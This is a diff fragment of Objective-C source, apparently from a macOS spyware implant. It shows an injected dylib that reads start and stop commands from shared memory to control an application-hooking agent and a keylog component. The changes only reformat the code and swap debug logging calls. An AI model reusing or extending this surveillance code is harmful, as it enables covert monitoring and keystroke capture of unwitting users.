@@ -645,34 +645,30 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                     fromComponent: COMP_AGENT];
       
       if (readData != nil)
-      {
-#ifdef DEBUG
-        NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
-#endif
-        
-        shMemCommand = (shMemoryCommand *)[readData bytes];
-        
-        if (appFlag == 0
-            && shMemCommand->command == AG_START)
         {
+          shMemCommand = (shMemoryCommand *)[readData bytes];
+
+          if (appFlag == 0
+              && shMemCommand->command == AG_START)
+            {
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"[DYLIB] %s: Starting Agent Application", __FUNCTION__);
+              infoLog(@"Starting Agent Application");
 #endif
-          
-          appFlag = 1;
-        }
-        else if ((appFlag == 1 || appFlag == 2)
-                 && shMemCommand->command == AG_STOP)
-        {
+
+              appFlag = 1;
+            }
+          else if ((appFlag == 1 || appFlag == 2)
+                   && shMemCommand->command == AG_STOP)
+            {
 #ifdef DEBUG
-          NSLog(@"[DYLIB] %s: Stopping Agent Application", __FUNCTION__);
+              infoLog(@"Stopping Agent Application");
 #endif
-          
-          appFlag = 3;
+
+              appFlag = 3;
+            }
+
+          //[readData release];
         }
-        
-        //[readData release];
-      }
       
       readData = [mSharedMemoryCommand readMemory: OFFT_KEYLOG
                                     fromComponent: COMP_AGENT];
@@ -878,30 +874,28 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         }
       
       if (appFlag == 1)
-      {
-        appFlag = 2;
-        
-        RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
-        
-        [appAgent start];
-        
+        {
+          appFlag = 2;
+          RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
+
+          [appAgent start];
+
 #ifdef DEBUG_INPUT_MANAGER
-        NSLog(@"%s: Hooking Application", __FUNCTION__);
+          infoLog(@"Hooking Application agent");
 #endif
-        
-      }
+
+        }
       else if (appFlag == 3)
-      {
-        appFlag = 0;
-        RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
-        
-        [appAgent stop];
-        
+        {
+          appFlag = 0;
+          RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
+
+          [appAgent stop];
+
 #ifdef DEBUG_INPUT_MANAGER
-        NSLog(@"%s: Stopping Application", __FUNCTION__);
+          infoLog(@"Stopping Application agent");
 #endif
-        
-      }
+        }
       
       if (keyboardFlag == 1)
         {
